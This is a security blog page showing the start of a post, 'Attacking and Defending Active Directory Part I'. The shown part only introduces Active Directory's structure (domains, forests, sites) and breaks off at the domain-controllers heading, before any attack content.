<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="profile" href="https://gmpg.org/xfn/11">
<title>anotsodev &#8211; Information Security &amp; Ethical Hacking</title>
<script type="63937a03c1b5e11e36329285-text/javascript">
/* <![CDATA[ */
window.JetpackScriptData = {"site":{"icon":"https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/cropped-LogoMakr_4yoCil.png?fit=512%2C512&ssl=1&w=64","title":"anotsodev","host":"unknown","is_wpcom_platform":false}};
/* ]]> */
</script>
<meta name="robots" content="max-image-preview:large">
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="pjKBbixYnQrjz_byc9IjUKNdUOYE32wU3zgBOvPjtOE">
<meta name="msvalidate.01" content="5E4C54D663EA69CB3EE435936D606E9B">
<meta name="p:domain_verify" content="9fc04f66a5d8a6c1e7739b8b6ff71593">
<link rel="dns-prefetch" href="//stats.wp.com">
<link rel="dns-prefetch" href="//widgets.wp.com">
<link rel="dns-prefetch" href="//s0.wp.com">
<link rel="dns-prefetch" href="//0.gravatar.com">
<link rel="dns-prefetch" href="//1.gravatar.com">
<link rel="dns-prefetch" href="//2.gravatar.com">
<link rel="dns-prefetch" href="//jetpack.wordpress.com">
<link rel="dns-prefetch" href="//public-api.wordpress.com">
<link rel="preconnect" href="//c0.wp.com">
<link rel="preconnect" href="//i0.wp.com">
<link rel="alternate" type="application/rss+xml" title="anotsodev &raquo; Feed" href="/feed/">
<link rel="alternate" type="application/rss+xml" title="anotsodev &raquo; Comments Feed" href="/comments/feed/">
<script type="63937a03c1b5e11e36329285-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"ðŸ³ï¸â€âš§ï¸","ðŸ³ï¸â€‹âš§ï¸")?!1:!n(e,"ðŸ‡ºðŸ‡³","ðŸ‡ºâ€‹ðŸ‡³")&&!n(e,"ðŸ´ó §ó ¢ó ¥ó ®ó §ó ¿","ðŸ´â€‹ó §â€‹ó ¢â€‹ó ¥â€‹ó ®â€‹ó §â€‹ó ¿");case"emoji":return!n(e,"ðŸ¦â€ðŸ”¥","ðŸ¦â€‹ðŸ”¥")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id="wp-emoji-styles-inline-css" type="text/css">img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}</style>
<link rel="stylesheet" id="wp-block-library-css" href="https://c0.wp.com/c/6.8.1/wp-includes/css/dist/block-library/style.min.css" type="text/css" media="all">
<style id="classic-theme-styles-inline-css" type="text/css">/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}</style>
<link rel="stylesheet" id="mediaelement-css" href="https://c0.wp.com/c/6.8.1/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css" type="text/css" media="all">
<link rel="stylesheet" id="wp-mediaelement-css" href="https://c0.wp.com/c/6.8.1/wp-includes/js/mediaelement/wp-mediaelement.min.css" type="text/css" media="all">
<style id="jetpack-sharing-buttons-style-inline-css" type="text/css">.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}</style>
<style id="global-styles-inline-css" type="text/css">:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}</style>
<link rel="stylesheet" id="wp-bootstrap-starter-bootstrap-css-css" href="/wp-content/themes/wp-bootstrap-starter/inc/assets/css/bootstrap.min.css?ver=6.8.1" type="text/css" media="all">
<link rel="stylesheet" id="wp-bootstrap-starter-fontawesome-cdn-css" href="/wp-content/themes/wp-bootstrap-starter/inc/assets/css/fontawesome.min.css?ver=6.8.1" type="text/css" media="all">
<link rel="stylesheet" id="wp-bootstrap-starter-style-css" href="/wp-content/themes/wp-bootstrap-starter/style.css?ver=6.8.1" type="text/css" media="all">
<link rel="stylesheet" id="jetpack_likes-css" href="https://c0.wp.com/p/jetpack/14.8/modules/likes/style.css" type="text/css" media="all">
<style id="akismet-widget-style-inline-css" type="text/css">.a-stats {
				--akismet-color-mid-green: #357b49;
				--akismet-color-white: #fff;
				--akismet-color-light-grey: #f6f7f7;

				max-width: 350px;
				width: auto;
			}

			.a-stats * {
				all: unset;
				box-sizing: border-box;
			}

			.a-stats strong {
				font-weight: 600;
			}

			.a-stats a.a-stats__link,
			.a-stats a.a-stats__link:visited,
			.a-stats a.a-stats__link:active {
				background: var(--akismet-color-mid-green);
				border: none;
				box-shadow: none;
				border-radius: 8px;
				color: var(--akismet-color-white);
				cursor: pointer;
				display: block;
				font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen-Sans', 'Ubuntu', 'Cantarell', 'Helvetica Neue', sans-serif;
				font-weight: 500;
				padding: 12px;
				text-align: center;
				text-decoration: none;
				transition: all 0.2s ease;
			}

			/* Extra specificity to deal with TwentyTwentyOne focus style */
			.widget .a-stats a.a-stats__link:focus {
				background: var(--akismet-color-mid-green);
				color: var(--akismet-color-white);
				text-decoration: none;
			}

			.a-stats a.a-stats__link:hover {
				filter: brightness(110%);
				box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06), 0 0 2px rgba(0, 0, 0, 0.16);
			}

			.a-stats .count {
				color: var(--akismet-color-white);
				display: block;
				font-size: 1.5em;
				line-height: 1.4;
				padding: 0 13px;
				white-space: nowrap;
			}</style>
<link rel="stylesheet" id="generate-blog-images-css" href="/wp-content/plugins/gp-premium/blog/functions/css/featured-images.min.css?ver=1.11.1" type="text/css" media="all">
<link rel="stylesheet" id="generate-navigation-branding-css" href="/wp-content/plugins/gp-premium/menu-plus/functions/css/navigation-branding.min.css?ver=1.11.1" type="text/css" media="all">
<script type="63937a03c1b5e11e36329285-text/javascript" src="https://c0.wp.com/c/6.8.1/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="63937a03c1b5e11e36329285-text/javascript" src="https://c0.wp.com/c/6.8.1/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<!--[if lt IE 9]>
<script type="text/javascript" src="/wp-content/themes/wp-bootstrap-starter/inc/assets/js/html5.js?ver=3.7.0" id="html5hiv-js"></script>
<![endif]-->
<link rel="https://api.w.org/" href="/wp-json/">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd">
<meta name="generator" content="WordPress 6.8.1">
<link rel="shortlink" href="https://wp.me/bOviL">
	<style>img#wpstats{display:none}</style>
		<link rel="pingback" href="/xmlrpc.php">    <style type="text/css">#page-sub-header { background: #fff; }</style>
    
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="website">
<meta property="og:title" content="anotsodev">
<meta property="og:description" content="Information Security &amp; Ethical Hacking">
<meta property="og:url" content="/">
<meta property="og:site_name" content="anotsodev">
<meta property="og:image" content="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/cropped-LogoMakr_4yoCil.png?fit=512%2C512&#038;ssl=1">
<meta property="og:image:width" content="512">
<meta property="og:image:height" content="512">
<meta property="og:image:alt">
<meta property="og:locale" content="en_US">
<meta name="twitter:site" content="@anotsodev">

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/cropped-LogoMakr_4yoCil.png?fit=32%2C32&#038;ssl=1" sizes="32x32">
<link rel="icon" href="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/cropped-LogoMakr_4yoCil.png?fit=192%2C192&#038;ssl=1" sizes="192x192">
<link rel="apple-touch-icon" href="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/cropped-LogoMakr_4yoCil.png?fit=180%2C180&#038;ssl=1">
<meta name="msapplication-TileImage" content="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/cropped-LogoMakr_4yoCil.png?fit=270%2C270&#038;ssl=1">
</head>

<body class="home blog wp-theme-wp-bootstrap-starter post-image-above-header post-image-aligned-left sticky-menu-fade mobile-header hfeed">


<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
    	<header id="masthead" class="site-header navbar-static-top navbar-light" role="banner">
        <div class="container">
            <nav class="navbar navbar-expand-xl p-0">
                <div class="navbar-brand">
                                            <a class="site-title" href="/">anotsodev</a>
                    
                </div>
                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-nav" aria-controls="" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>

                <div id="main-nav" class="collapse navbar-collapse justify-content-end"><ul id="menu-primary" class="navbar-nav">
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-1664" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1664 nav-item"><a title="Home" href="/" class="nav-link">Home</a></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-1668" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1668 nav-item"><a title="Penetration Testing" href="/category/pentesting/" class="nav-link">Penetration Testing</a></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-1665" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1665 nav-item"><a title="Information Security" href="/category/infosec/" class="nav-link">Information Security</a></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-1666" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1666 nav-item"><a title="Hack the Box" href="/category/hack-the-box/" class="nav-link">Hack the Box</a></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-1667" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1667 nav-item"><a title="Capture The Flag" href="/category/ctf/" class="nav-link">Capture The Flag</a></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-227" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-227 nav-item"><a title="Online Resources" href="/online-resources/" class="nav-link">Online Resources</a></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-228" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-228 nav-item"><a title="About Me" href="/about-me/" class="nav-link">About Me</a></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-16" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-16 nav-item"><a title="Contact" href="/contact/" class="nav-link">Contact</a></li>
</ul></div>
            </nav>
        </div>
	</header><!-- #masthead -->
    	<div id="content" class="site-content">
		<div class="container">
			<div class="row">
                
	<section id="primary" class="content-area col-sm-12 col-md-12 col-lg-8">
		<div id="main" class="site-main" role="main">

		
<article id="post-1561" class="post-1561 post type-post status-publish format-standard has-post-thumbnail hentry category-infosec category-network-defense category-pentesting category-windows tag-active-directory tag-cybersecurity tag-information-security tag-penetration-testing tag-windows no-featured-image-padding">
	<div class="post-thumbnail">
		<img width="2560" height="2560" src="/wp-content/uploads/2020/04/heirarchy.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" fetchpriority="high" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/heirarchy.png?w=2560&amp;ssl=1 2560w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/heirarchy.png?resize=300%2C300&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/heirarchy.png?resize=1024%2C1024&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/heirarchy.png?resize=150%2C150&amp;ssl=1 150w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/heirarchy.png?resize=768%2C768&amp;ssl=1 768w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/heirarchy.png?resize=1536%2C1536&amp;ssl=1 1536w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/heirarchy.png?resize=2048%2C2048&amp;ssl=1 2048w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/heirarchy.png?w=2340&amp;ssl=1 2340w" sizes="(max-width: 2560px) 100vw, 2560px">	</div>
	<header class="entry-header">
		<h2 class="entry-title"><a href="/attacking-and-defending-active-directory-part-i/" rel="bookmark">Attacking and Defending Active Directory Part I</a></h2>		<div class="entry-meta">
			<span class="posted-on">Posted on <a href="/attacking-and-defending-active-directory-part-i/" rel="bookmark"><time class="entry-date published" datetime="2020-04-19T15:12:50+08:00">April 19, 2020</time></a></span> | <span class="byline"> by <span class="author vcard"><a class="url fn n" href="/author/anotsodev/">anotsodev</a></span></span> | <span class="comments-link"><i class="fa fa-comments" aria-hidden="true"></i> <a href="/attacking-and-defending-active-directory-part-i/#respond">Leave a Comment<span class="screen-reader-text"> on Attacking and Defending Active Directory Part I</span></a></span>		</div>
<!-- .entry-meta -->
			</header><!-- .entry-header -->
	<div class="entry-content">
		
<h2 class="wp-block-heading">Introduction</h2>



<p><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Active_Directory" target="_blank">Microsoft Active Directory</a> is one of the most interesting&nbsp;services to attack since we can gather a lot of information just by checking if the server is misconfigured which enables us to enumerate treasure trove of information like Domain Users, Administrative Shares, Password Policies and many more.</p>



<p>In this series, I will be separating this into three parts. The first part will include the introduction of Active Directory and its components.</p>



<p>The second part will include different types of attacks against Active Directory and the demonstration on how to execute these attacks.</p>



<p>And lastly, we&#8217;ll be covering different approaches in defending and reducing attack surfaces of Active Directory.</p>



<h2 class="wp-block-heading">What is Active Directory?</h2>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" decoding="async" width="600" height="283" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/active-directory-logo.png?resize=600%2C283&#038;ssl=1" alt="" class="wp-image-1564" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/active-directory-logo.png?w=600&amp;ssl=1 600w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/active-directory-logo.png?resize=300%2C142&amp;ssl=1 300w" sizes="(max-width: 600px) 100vw, 600px"></figure>



<p>Active Directory or AD is a centralized Windows OS directory service that stores information about objects on the network and automates the management of user data, security, and distributed resources.</p>



<h2 class="wp-block-heading">Active Directory Components</h2>



<figure class="wp-block-image size-large is-style-default"><img decoding="async" width="2550" height="1700" src="https://i2.wp.com/anotsodev.me/wp-content/uploads/2020/04/Components.png?fit=1024%2C683&amp;ssl=1" alt="" class="wp-image-1565" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/Components.png?w=2550&amp;ssl=1 2550w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/Components.png?resize=300%2C200&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/Components.png?resize=1024%2C683&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/Components.png?resize=768%2C512&amp;ssl=1 768w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/Components.png?resize=1536%2C1024&amp;ssl=1 1536w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/Components.png?resize=2048%2C1365&amp;ssl=1 2048w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/Components.png?w=2340&amp;ssl=1 2340w" sizes="(max-width: 1170px) 100vw, 1170px"></figure>



<p>Just to give you an overview of the different components of Active Directory, the Active Directory consists of:</p>



<ul class="wp-block-list">
<li><strong>Domains</strong></li>
<li><strong>Forests</strong></li>
<li><strong>Sites</strong></li>
<li><strong>Domain Controllers</strong></li>
<li><strong>Organizational Units (OU)</strong></li>
</ul>



<p>Each of these components has their own purpose that enables Active Directory to function within an organization.</p>



<p>I will just summarize the meanings and functions of these components but you can read more about Active Directory on the <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview" target="_blank" rel="noreferrer noopener">official documentation</a> of Microsoft. </p>



<h3 class="wp-block-heading">Domains</h3>



<p>Active Directory domains are where the users and computers are located. Each domain holds a database that contains the information of an objectâ€™s identity. </p>



<p>For example, I have an AD domain called internal.anotsodev.org. This domain contains all the information of users and computers joined in this domain.</p>



<h3 class="wp-block-heading">Forests</h3>



<p>Active Directory forests are the topmost logical containers of the hierarchy. The illustration below shows the organizational domain forest model of <strong>internal.anotsodev.org</strong>.</p>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="633" height="412" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/AD-Forest.png?resize=633%2C412&#038;ssl=1" alt="" class="wp-image-1562" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/AD-Forest.png?w=633&amp;ssl=1 633w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/AD-Forest.png?resize=300%2C195&amp;ssl=1 300w" sizes="auto, (max-width: 633px) 100vw, 633px"></figure>



<h3 class="wp-block-heading">Sites</h3>



<p>Active Directory Domain Sites enables the users to authenticate with the nearest domain controller and provides domain preference either administrative or least privilege to the current logged in user.</p>



<p>Sites are organized by one or more IP subnets based on the geographic location of the domain users joined to a domain.</p>



<h3 class="wp-block-heading">Domain Controllers</h3>



